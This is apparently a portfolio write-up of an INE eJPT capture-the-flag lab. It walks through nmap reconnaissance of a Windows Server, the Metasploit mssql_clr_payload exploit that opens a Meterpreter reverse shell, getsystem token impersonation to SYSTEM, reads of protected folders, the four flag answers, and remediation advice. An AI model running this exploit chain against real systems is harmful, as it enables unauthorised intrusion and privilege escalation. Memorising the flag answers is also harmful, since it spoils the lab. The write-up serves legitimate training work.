<div align="center">
  <a href="../README.md">⬅️ <b>Back to Section Hub</b></a> | <a href="../../README.md">📂 <b>eJPT Track Hub</b></a> | <a href="../../../README.md">🏠 <b>Portfolio Root</b></a>
</div>

<br>

<div align="center">
  <h1>🎯 Host & Network Penetration Testing — The Metasploit Framework CTF 1 🎯</h1>
  <p><b>Platform:</b> INE Security | <b>Learning Path:</b> Penetration Testing Student (eJPT v2) | <b>Course:</b> Host & Network Penetration Testing: The Metasploit Framework (MSF) | <b>Difficulty:</b> Easy / Medium</p>
  <p><i>Date Completed: 02 November 2026</i></p>

[![Platform - INE](https://img.shields.io/badge/Platform-INE%20Security-0078D4?style=flat-square&logo=target)](https://ine.com/)
[![Track - eJPT](https://img.shields.io/badge/Track-eJPT%20v2-orange?style=flat-square&logo=hackthebox)](../../README.md)
[![Flags - 4/4](https://img.shields.io/badge/Flags%20Captured-4%20%2F%204-success?style=flat-square&logo=checkmarx)](./README.md)
[![MITRE ATT&CK](https://img.shields.io/badge/MITRE%20ATT%26CK-T1190%20%7C%20T1134.001%20%7C%20T1059%20%7C%20T1083-red?style=flat-square)](https://attack.mitre.org/)
[![CVSS v3.1](https://img.shields.io/badge/Max%20Severity-9.8%20(Critical)-critical?style=flat-square)](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator)
</div>

---

## 📋 Objective & Scope
> **Execute active host and network penetration testing against a target Windows Server machine (`target.ine.local`). The assessment requires conducting comprehensive network reconnaissance, utilizing Metasploit database features, weaponizing Microsoft SQL Server (MSSQL) CLR assemblies to achieve remote code execution, exploiting Windows token impersonation privileges (`SeImpersonatePrivilege`) via named pipe reflection to elevate to `NT AUTHORITY\SYSTEM`, and enumerating protected system and user directories to capture all 4 challenge flags.**

- **Target Host:** `target.ine.local` (`10.5.26.81` / `10.5.16.19`)
- **Operating System:** Microsoft Windows Server 2008 R2 – 2012 (`WIN-5BQ220KH4SO`)
- **Key Services Audited:** Microsoft SQL Server 2012 SP3 (1433/tcp), SMB (445/tcp), MSRPC (135/tcp), RDP (3389/tcp), WinRM (5985/tcp)
- **Primary Tooling:** Metasploit Framework (`msfconsole`), PostgreSQL Backend, Meterpreter, Windows CLI / PowerShell

<div align="center">
  <img src="./images/Screenshot%202026-11-02%20120341.png" alt="INE The Metasploit Framework CTF 1 challenge dashboard showing target details and flag tasks" width="850px">
  <br><i>Figure 1: INE Lab Dashboard — Challenge briefing, scope requirements, and flag capture objectives.</i>
</div>

<br>

---

## 🛠️ Tools Used
| Tool | Purpose in Assessment |
| :--- | :--- |
| **Nmap** | Comprehensive TCP port reconnaissance, service version detection (`-sV`), and OS/script scanning (`-sC`). |
| **PostgreSQL** | Metasploit Framework database storage backend tracking hosts, services, and session credentials. |
| **Metasploit Framework (`msfconsole`)** | Primary exploitation engine utilized for MSSQL CLR stored procedure injection and session management. |
| **`exploit/windows/mssql/mssql_clr_payload`** | Weaponized Metasploit exploit module executing arbitrary CLR payload assemblies inside Microsoft SQL Server. |
| **Meterpreter** | In-memory advanced interactive command payload used for privilege auditing (`getprivs`) and token elevation (`getsystem`). |
| **Windows CLI / PowerShell** | Local system discovery, file searching (`dir /s /b`), and flag content exfiltration. |

<br>

---

## 🗺️ MITRE ATT&CK® Enterprise Mapping
| Tactic | Technique ID | Technique Name | Description in Assessment |
| :--- | :--- | :--- | :--- |
| **Reconnaissance** | `T1595.002` | Active Scanning: Vulnerability Scanning | Full-port TCP sweep and NSE script scanning targeting Microsoft SQL Server and SMB. |
| **Initial Access** | `T1190` | Exploit Public-Facing Application | Exploiting Microsoft SQL Server via Common Language Runtime (CLR) assembly payload execution. |
| **Execution** | `T1059.003` | Command & Scripting Interpreter: Windows Command Shell | Executing Windows batch commands (`dir`, `type`) within target shell channels. |
| **Execution** | `T1059.001` | Command & Scripting Interpreter: PowerShell | Navigating privileged directories and exfiltrating flag artifacts via PowerShell. |
| **Privilege Escalation** | `T1134.001` | Access Token Manipulation: Token Impersonation/Theft | Abusing `SeImpersonatePrivilege` via named pipe impersonation (PrintSpooler variant) to attain `SYSTEM`. |
| **Discovery** | `T1083` | File and Directory Discovery | Recursive file system searching (`dir C:\Windows\System32\*.txt /s /b`) for hidden challenge flags. |
| **Collection** | `T1005` | Data from Local System | Reading flag text files directly from `C:\`, `System32\config\`, `drivers\etc\`, and `Administrator\Desktop\`. |

<br>

---

## 🔍 1. Reconnaissance & Service Fingerprinting

We initiate comprehensive network reconnaissance against `target.ine.local` using Nmap version detection (`-sV`) and default vulnerability/script checks (`-sC`):

```bash
nmap -sV -sC target.ine.local
```

```text
Nmap scan report for target.ine.local (10.5.26.81)
Host is up (0.0025s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2012 11.00.6020.00; SP3
| ms-sql-ntlm-info: 
|   10.5.26.81\MSSQLSERVER: 
|     Target_Name: WIN-5BQ220KH4SO
|     NetBIOS_Domain_Name: WIN-5BQ220KH4SO
|     NetBIOS_Computer_Name: WIN-5BQ220KH4SO
|     DNS_Domain_Name: WIN-5BQ220KH4SO
|     DNS_Computer_Name: WIN-5BQ220KH4SO
|     Product_Version: 6.3.9600
| ms-sql-info: 
|   10.5.26.81\MSSQLSERVER: 
|     Instance name: MSSQLSERVER
|     Version: 
|       name: Microsoft SQL Server 2012 SP3
|       number: 11.00.6020.00
|       Product: Microsoft SQL Server 2012
|       Service pack level: SP3
|       Post-SP patches applied: false
|     TCP port: 1433
|     Clustered: false
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=WIN-5BQ220KH4SO
```

<div align="center">
  <img src="./images/Screenshot%202026-11-02%20121108.png" alt="Nmap scan report part 1 showing MSSQL Server 2012 SP3 and SMB services" width="850px">
  <br><i>Figure 2: Initial Nmap service scan results — Identifying active MSSQL instance `MSSQLSERVER` on port 1433/tcp.</i>
</div>

<br>

The scan continues, detecting remote management protocols and evaluating SMB security configurations:

```text
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49170/tcp open  msrpc        Microsoft Windows RPC
49191/tcp open  msrpc        Microsoft Windows RPC
49192/tcp open  msrpc        Microsoft Windows RPC

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:0:2: 
|_    Message signing enabled but not required
```

<div align="center">
  <img src="./images/Screenshot%202026-11-02%20121311.png" alt="Nmap scan report part 2 showing WinRM and SMB signing disabled" width="850px">
  <br><i>Figure 3: Nmap service scan results (Part 2) — WinRM (5985/tcp) and SMB message signing disabled.</i>
</div>

### Key Reconnaissance Findings:
- **Microsoft SQL Server 2012 SP3 (Port 1433/tcp):** Instance `MSSQLSERVER` is running unclustered on Windows build `6.3.9600`.
- **Target Hostname:** `WIN-5BQ220KH4SO`.
- **SMB & Remote Management:** SMB (445/tcp) has message signing disabled; WinRM (5985/tcp) and RDP (3389/tcp) are open.

<br>

---

## ⚡ 2. Flag 1 Acquisition: MSSQL CLR Payload Remote Code Execution

**Task Prompt:**
> *"Gain access to the MSSQLSERVER account on the target machine to retrieve the first flag."*

### Step 1: Initializing Metasploit Framework & Database
To ensure rapid session tracking and module state management, we start the PostgreSQL service and launch `msfconsole`:

```bash
service postgresql start && msfconsole -q
```

We verify the database connection:
```text
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.
```

<div align="center">
  <img src="./images/Screenshot%202026-11-02%20123035.png" alt="Starting PostgreSQL and verifying Metasploit db_status" width="850px">
  <br><i>Figure 4: Initializing the local PostgreSQL database service and validating Metasploit connectivity.</i>
</div>

<br>

### Step 2: Weaponizing Microsoft SQL Server via CLR Assembly Injection
We search for MSSQL exploitation modules in Metasploit and identify `exploit/windows/mssql/mssql_clr_payload`. 

This module leverages SQL Server Common Language Runtime (CLR) integration. By enabling the database `TRUSTWORTHY` property and toggling `clr enabled`, the module registers a custom .NET assembly containing a staged Meterpreter payload and executes it via an exposed stored procedure:

```bash
msf6 > use exploit/windows/mssql/mssql_clr_payload
msf6 exploit(windows/mssql/mssql_clr_payload) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/mssql/mssql_clr_payload) > set RHOSTS target.ine.local
msf6 exploit(windows/mssql/mssql_clr_payload) > run
```

```text
[*] Started reverse TCP handler on 10.10.47.15:4444 
[!] 10.5.16.19:1433 - Setting EXITFUNC to 'thread' so we don't kill SQL Server
[*] 10.5.16.19:1433 - Database does not have TRUSTWORTHY setting on, enabling ...
[*] 10.5.16.19:1433 - Database does not have CLR support enabled, enabling ...
[*] 10.5.16.19:1433 - Using version v3.5 of the Payload Assembly
[*] 10.5.16.19:1433 - Adding custom payload assembly ...
[*] 10.5.16.19:1433 - Exposing payload execution stored procedure ...
[*] 10.5.16.19:1433 - Executing the payload ...
[*] 10.5.16.19:1433 - Removing stored procedure ...
[*] 10.5.16.19:1433 - Removing assembly ...
[*] Sending stage (201798 bytes) to 10.5.16.19
[*] 10.5.16.19:1433 - Restoring CLR setting ...
[*] 10.5.16.19:1433 - Restoring Trustworthy setting ...
[*] Meterpreter session 1 opened (10.10.47.15:4444 -> 10.5.16.19:49294) at 2026-11-02 12:52:11 +0530
```

<div align="center">
  <img src="./images/Screenshot%202026-11-02%20125223.png" alt="Metasploit mssql_clr_payload exploit opening Meterpreter session 1" width="850px">
  <br><i>Figure 5: Successfully establishing a 64-bit Meterpreter reverse shell session via MSSQL CLR assembly execution.</i>
</div>

<br>

### Step 3: Flag 1 Retrieval from Root Drive (`C:\`)
With an active Meterpreter session running in the context of the MSSQL service account, we drop into a Windows command shell and navigate to `C:\`:

```cmd
C:\Windows\system32> cd \
C:\> dir
```

The directory listing reveals `flag1.txt` in the root volume:
```text
Directory of C:\

11/02/2026  07:17 AM                34 flag1.txt
08/22/2013  03:52 PM    <DIR>          PerfLogs
01/09/2025  07:00 AM    <DIR>          Program Files
12/15/2024  09:27 AM    <DIR>          Program Files (x86)
01/09/2025  07:12 AM    <DIR>          Users
01/09/2025  07:08 AM    <DIR>          Windows
               1 File(s)             34 bytes
```

We read the flag file:
```cmd
C:\> type flag1.txt
5f0190ab67774a93b736d0079fdea6fc
```

<div align="center">
  <img src="./images/Screenshot%202026-11-02%20125805.png" alt="Reading flag1.txt from C:\ drive displaying the flag hash" width="850px">
  <br><i>Figure 6: Accessing `C:\flag1.txt` to capture Flag 1.</i>
</div>

```text
5f0190ab67774a93b736d0079fdea6fc
```
- **Submitted Hash / Value:** `5f0190ab67774a93b736d0079fdea6fc`

<br>

---

## ⚡ 3. Flag 2 Acquisition: Windows Configuration Folder Exploration

**Task Prompt:**
> *"Locate the second flag within the Windows configuration folder."*

### Step 1: Navigating to `C:\Windows\System32\config`
Windows system configuration registries and hives (SAM, SYSTEM, SECURITY, SOFTWARE) are stored in `C:\Windows\System32\config`. We navigate directly to this folder:

```cmd
C:\> cd C:\Windows\System32\config
C:\Windows\System32\config> dir
```

```text
Directory of C:\Windows\System32\config

11/02/2026  07:18 AM    <DIR>          .
11/02/2026  07:18 AM    <DIR>          ..
05/09/2014  12:52 AM           262,144 BCD-Template
11/02/2026  07:18 AM       101,187,584 COMPONENTS
...[snip]...
11/02/2026  07:17 AM                34 flag2.txt
07/21/2026  12:36 PM           262,144 SAM
07/21/2026  12:36 PM           262,144 SECURITY
07/21/2026  12:36 PM        89,653,248 SOFTWARE
07/21/2026  12:36 PM        12,582,912 SYSTEM
```

<div align="center">
  <img src="./images/Screenshot%202026-11-02%20125730.png" alt="Listing C:\Windows\System32\config and reading flag2.txt" width="850px">
  <br><i>Figure 7: Directory listing of `C:\Windows\System32\config` and retrieval of `flag2.txt`.</i>
</div>

<br>

### Step 2: Flag 2 Extraction
We display the contents of `flag2.txt`:

```cmd
C:\Windows\System32\config> type flag2.txt
7e645311d6b642639a45d36f6a79fb69
```

```text
7e645311d6b642639a45d36f6a79fb69
```
- **Submitted Hash / Value:** `7e645311d6b642639a45d36f6a79fb69`

<br>

---

## ⚡ 4. Flag 3 Acquisition: System Directory Enumeration & Privilege Escalation Hint

**Task Prompt:**
> *"The third flag is also hidden within the system directory. Find it to uncover a hint for accessing the final flag."*

### Step 1: Recursive File Discovery in `System32`
The prompt specifies that the third flag is located somewhere inside the Windows system directory (`C:\Windows\System32`) and holds a critical hint for the final flag. 

To locate the file without manual folder traversal, we execute a recursive search for all `.txt` files:

```cmd
C:\Windows\system32> dir C:\Windows\System32\*.txt /s /b
```

```text
C:\Windows\System32\catroot2\dberr.txt
C:\Windows\System32\config\flag2.txt
C:\Windows\System32\config\systemprofile\AppData\Local\Amazon\Ec2Config\Logs\FrameworkLaunchException.txt
C:\Windows\System32\drivers\gmreadme.txt
C:\Windows\System32\drivers\etc\EscaltePrivilageToGetThisFlag.txt
C:\Windows\System32\en-US\erofflps.txt
C:\Windows\System32\WindowsPowerShell\v1.0\en-US\default.help.txt
C:\Windows\System32\WindowsPowerShell\v1.0\Modules\BitsTransfer\en-US\about_BITS_Cmdlets.help.txt
```

<div align="center">
  <img src="./images/Screenshot%202026-11-02%20131547.png" alt="Recursive search in System32 revealing EscaltePrivilageToGetThisFlag.txt" width="850px">
  <br><i>Figure 8: Recursive discovery locating `C:\Windows\System32\drivers\etc\EscaltePrivilageToGetThisFlag.txt`.</i>
</div>

<br>

### Step 2: Flag 3 Extraction & Hint Analysis
The file `EscaltePrivilageToGetThisFlag.txt` is located in `C:\Windows\System32\drivers\etc\`. We read its contents:

```cmd
C:\Windows\system32> type C:\Windows\System32\drivers\etc\EscaltePrivilageToGetThisFlag.txt
924997891d2f4b76adaaf60d1dd35487
```

**Key Takeaway / Hint:**
- The filename `EscaltePrivilageToGetThisFlag.txt` provides the exact architectural hint: accessing the Administrator home directory (where Flag 4 resides) requires elevating our current session privileges to administrative or `SYSTEM` level.

```text
924997891d2f4b76adaaf60d1dd35487
```
- **Submitted Hash / Value:** `924997891d2f4b76adaaf60d1dd35487`

<br>

---

## ⚡ 5. Flag 4 Acquisition: Token Impersonation (SYSTEM) & Administrator Directory Exfiltration

**Task Prompt:**
> *"Investigate the Administrator directory to find the fourth flag."*

### Step 1: Auditing Token Privileges (`SeImpersonatePrivilege`)
From the Meterpreter prompt, we inspect our enabled Windows user privileges:

```text
meterpreter > getprivs

Enabled Process Privileges
==========================
Name
----
SeAssignPrimaryTokenPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
```

The service process possesses **`SeImpersonatePrivilege`** (Impersonate a client after authentication). This privilege allows service accounts to impersonate tokens of higher-privileged processes connecting to local named pipes or RPC servers.

<br>

### Step 2: Escalating Privileges to `NT AUTHORITY\SYSTEM`
We execute Metasploit's built-in `getsystem` command:

```text
meterpreter > getsystem
... got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
```

Metasploit successfully abuses the Windows Print Spooler service (`technique 5`), triggering an RPC callback to a controlled named pipe and impersonating the resulting token to elevate the session directly to **`NT AUTHORITY\SYSTEM`**.

<div align="center">
  <img src="./images/Screenshot%202026-11-02%20125700.png" alt="Meterpreter getprivs and getsystem technique 5 achieving SYSTEM" width="850px">
  <br><i>Figure 9: Inspecting token privileges and executing `getsystem` via PrintSpooler named pipe impersonation.</i>
</div>

<br>

### Step 3: Accessing the Administrator Desktop & Flag 4 Retrieval
Operating with full `SYSTEM` authority, we drop into an interactive command prompt and spawn a PowerShell session to inspect the Administrator profile:

```powershell
PS C:\Users> cd Administrator
PS C:\Users\Administrator> ls

    Directory: C:\Users\Administrator

Mode                LastWriteTime     Length Name
----                -------------     ------ ----
d-r---       1/9/2025     7:12 AM            Contacts
d-r---       1/9/2025     7:12 AM            Desktop
d-r---       1/9/2025     7:12 AM            Documents
d-r---       1/9/2025     7:12 AM            Downloads
...[snip]...
-a----     12/15/2024     2:29 PM         13 query

PS C:\Users\Administrator> cd Desktop
PS C:\Users\Administrator\Desktop> ls
```

<div align="center">
  <img src="./images/Screenshot%202026-11-02%20130731.png" alt="Navigating to Administrator Desktop via PowerShell" width="850px">
  <br><i>Figure 10: Navigating into `C:\Users\Administrator\Desktop` as `NT AUTHORITY\SYSTEM`.</i>
</div>

<br>

The Desktop directory lists `flag4.txt` (34 bytes). We read the file:

```powershell
PS C:\Users\Administrator\Desktop> cat flag4.txt
d8b5eff0087e4efeababa6164e8f1f0a
```

<div align="center">
  <img src="./images/Screenshot%202026-11-02%20130806.png" alt="Reading flag4.txt on Administrator Desktop" width="850px">
  <br><i>Figure 11: Reading `flag4.txt` to capture Flag 4.</i>
</div>

```text
d8b5eff0087e4efeababa6164e8f1f0a
```
- **Submitted Hash / Value:** `d8b5eff0087e4efeababa6164e8f1f0a`

<br>

---

## 🏁 3. Flags Summary

| Flag # | Challenge Prompt / Task | Flag Value | Source / Methodology |
| :---: | :--- | :--- | :--- |
| **Flag 1** | Gain access to the MSSQLSERVER account on the target machine to retrieve the first flag. | `5f0190ab67774a93b736d0079fdea6fc` | Metasploit `windows/mssql/mssql_clr_payload` Meterpreter reverse shell -> `type C:\flag1.txt` |
| **Flag 2** | Locate the second flag within the Windows configuration folder. | `7e645311d6b642639a45d36f6a79fb69` | Windows registry & configuration directory -> `type C:\Windows\System32\config\flag2.txt` |
| **Flag 3** | The third flag is also hidden within the system directory. Find it to uncover a hint for accessing the final flag. | `924997891d2f4b76adaaf60d1dd35487` | Recursive search `dir C:\Windows\System32\*.txt /s /b` -> `type C:\Windows\System32\drivers\etc\EscaltePrivilageToGetThisFlag.txt` |
| **Flag 4** | Investigate the Administrator directory to find the fourth flag. | `d8b5eff0087e4efeababa6164e8f1f0a` | `getsystem` via PrintSpooler named pipe impersonation (`SeImpersonatePrivilege`) -> `cat C:\Users\Administrator\Desktop\flag4.txt` |

<br>

---

## 🛡️ 4. Vulnerability Risk Ratings & Defensive Hardening

### 📊 CVSS v3.1 Findings Matrix
| Finding | Severity | CVSS v3.1 Score | Vector String |
| :--- | :---: | :---: | :--- |
| **Microsoft SQL Server CLR Assembly Injection Remote Code Execution** | 🔴 **Critical** | **9.8** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Local Privilege Escalation via Token Impersonation (`SeImpersonatePrivilege`)** | 🔴 **High** | **7.8** | `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| **SMB Message Signing Disabled** | 🟡 **Medium** | **5.9** | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N` |
| **Permissive Read Access on Sensitive Configuration Folders** | 🟡 **Medium** | **5.5** | `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` |

<br>

<details>
<summary><b>Click to expand enterprise remediation strategies & hardening guidelines</b></summary>
<br>

### 1. Hardening Microsoft SQL Server CLR Integration
- **Root Cause:** Microsoft SQL Server had `clr enabled` or allowed unauthenticated/low-privilege database users to execute `sp_configure` and set databases to `TRUSTWORTHY ON`, allowing arbitrary .NET DLL assembly execution.
- **Remediation:**
  1. Disable CLR integration if custom .NET stored procedures are not strictly necessary:
     ```sql
     EXEC sp_configure 'show advanced options', 1;
     RECONFIGURE;
     EXEC sp_configure 'clr enabled', 0;
     RECONFIGURE;
     ```
  2. Set `TRUSTWORTHY` to `OFF` on all user and system databases:
     ```sql
     ALTER DATABASE [master] SET TRUSTWORTHY OFF;
     ```
  3. Run the SQL Server service under a dedicated Virtual Service Account (e.g., `NT Service\MSSQLSERVER`) or a Group Managed Service Account (gMSA) rather than a local or domain administrative account.

### 2. Mitigating Token Impersonation & Potato Exploitation
- **Root Cause:** The SQL Server service account was granted `SeImpersonatePrivilege` by default, allowing local attackers to abuse named pipe reflections and elevate to `SYSTEM`.
- **Remediation:**
  1. Audit user rights assignments in Local Security Policy (`secpol.msc`) under `Security Settings` -> `Local Policies` -> `User Rights Assignment` -> **Impersonate a client after authentication**. Ensure only `LOCAL SERVICE`, `NETWORK SERVICE`, and `Administrators` are assigned this right.
  2. Stop and disable the Windows Print Spooler service on domain controllers and standalone application servers if printing is not required:
     ```powershell
     Stop-Service -Name Spooler
     Set-Service -Name Spooler -StartupType Disabled
     ```

### 3. Enforcing SMB Message Signing
- **Root Cause:** SMB message signing was enabled but not required, leaving the host vulnerable to NTLM relay attacks.
- **Remediation:**
  - Enforce SMB Signing via Group Policy Object (GPO):
    `Computer Configuration -> Windows Settings -> Security Settings -> Local Policies -> Security Options`:
    - Set **Microsoft network client: Digitally sign communications (always)** to `Enabled`.
    - Set **Microsoft network server: Digitally sign communications (always)** to `Enabled`.

### 4. Restricting File System Permissions (ACLs)
- **Root Cause:** Standard service accounts had read permissions to various system folders containing sensitive configuration data.
- **Remediation:**
  - Audit and restrict Access Control Lists (ACLs) on sensitive administrative shares and directories (`C:\Windows\System32\config`, `C:\Users\Administrator`) to ensure only authorized administrators and `SYSTEM` have read/traverse rights.

</details>

<br>

---

## 💡 5. Key Learnings & Takeaways
- **Database Engine Exploitation Leads Directly to OS Compromise:** Microsoft SQL Server features like CLR integration and `xp_cmdshell` bridge database privileges directly into operating system command execution.
- **The Danger of `SeImpersonatePrivilege`:** Any service account possessing `SeImpersonatePrivilege` is effectively one step away from `NT AUTHORITY\SYSTEM`. Exploitation tools like Metasploit's `getsystem` (or standalone tools like PrintSpoofer) make privilege escalation trivial.
- **Postgres Database Integration Powers Efficient MSF Operations:** Starting the PostgreSQL backend before running `msfconsole` ensures smooth payload delivery, workspace separation, and persistent credential logging.
- **Methodical Reconnaissance to Root:** Moving seamlessly from Nmap service identification -> Metasploit CLR exploit -> Meterpreter reverse shell -> token privilege auditing (`getprivs`) -> SYSTEM elevation (`getsystem`) highlights a textbook eJPT penetration testing methodology.

---
<div align="center">
  <i>Walkthrough documented on 02 November 2026. Part of the INE eJPT Certification Journey.</i>
</div>
